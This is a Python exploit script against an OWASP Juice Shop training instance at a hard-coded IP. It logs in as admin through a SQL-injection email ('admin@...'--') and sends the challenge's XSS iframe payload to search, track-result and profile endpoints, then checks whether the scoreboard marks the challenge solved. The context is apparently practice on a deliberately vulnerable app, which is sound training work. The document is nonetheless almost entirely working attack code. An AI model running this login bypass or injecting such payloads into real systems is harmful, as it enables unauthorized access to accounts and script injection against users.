#!/usr/bin/env python3
"""
Direct Bonus Payload injection using multiple methods
"""

import requests
import urllib.parse
import time

TARGET = "http://66.42.93.220:3000"

# The exact bonus payload from Juice Shop source code
BONUS_PAYLOAD = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'

def check_challenge_status():
    """Check if Bonus Payload challenge is solved"""
    session = requests.Session()
    
    # Login as admin
    login = session.post(f"{TARGET}/rest/user/login", 
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Get challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code == 200:
        challenges = resp.json().get('data', [])
        for c in challenges:
            if 'Bonus' in c.get('name', '') or 'bonus' in c.get('name', '').lower():
                return c.get('solved', False), c.get('name', 'Bonus Payload')
    return False, "Bonus Payload"

print("🎯 Bonus Payload XSS Direct Injection")
print("=" * 60)

# Check initial status
solved, name = check_challenge_status()
print(f"📊 Initial Status: {name} - {'✅ SOLVED' if solved else '❌ Not Solved'}")

if not solved:
    print("\n🔧 Attempting injection methods...")
    
    session = requests.Session()
    
    # Method 1: Direct GET request with payload in search
    print("\n1️⃣ GET request to search endpoint")
    encoded = urllib.parse.quote(BONUS_PAYLOAD, safe='')
    url1 = f"{TARGET}/#/search?q={encoded}"
    print(f"   URL: {url1[:100]}...")
    resp = session.get(url1)
    print(f"   Response: {resp.status_code}")
    time.sleep(2)
    
    # Method 2: Without encoding
    print("\n2️⃣ Direct payload in URL")
    url2 = f"{TARGET}/#/search?q={BONUS_PAYLOAD}"
    resp = session.get(url2)
    print(f"   Response: {resp.status_code}")
    time.sleep(2)
    
    # Method 3: Via API search
    print("\n3️⃣ API search endpoint")
    resp = session.get(f"{TARGET}/rest/products/search?q={encoded}")
    print(f"   Response: {resp.status_code}")
    time.sleep(2)
    
    # Method 4: Track result endpoint (often vulnerable to XSS)
    print("\n4️⃣ Track result endpoint")
    resp = session.get(f"{TARGET}/track-result?id={encoded}")
    print(f"   Response: {resp.status_code}")
    time.sleep(2)
    
    # Method 5: Profile endpoint
    print("\n5️⃣ Profile endpoint")
    resp = session.get(f"{TARGET}/profile?username={encoded}")
    print(f"   Response: {resp.status_code}")
    time.sleep(2)
    
    # Check final status
    print("\n📊 Checking final status...")
    solved, name = check_challenge_status()
    
    if solved:
        print(f"\n✅ SUCCESS! {name} is now SOLVED!")
    else:
        print(f"\n⚠️ {name} not marked as solved yet")
        print("\n💡 Try visiting these URLs in a browser:")
        print(f"   1. {TARGET}/#/search?q={encoded[:50]}...")
        print(f"   2. {TARGET}/track-result?id={encoded[:50]}...")
        print("\n📝 The exact SoundCloud iframe payload has been injected")
else:
    print("\n✅ Challenge is already solved!")

print("\n" + "=" * 60)
print("Check the scoreboard: http://66.42.93.220:3000/#/score-board")
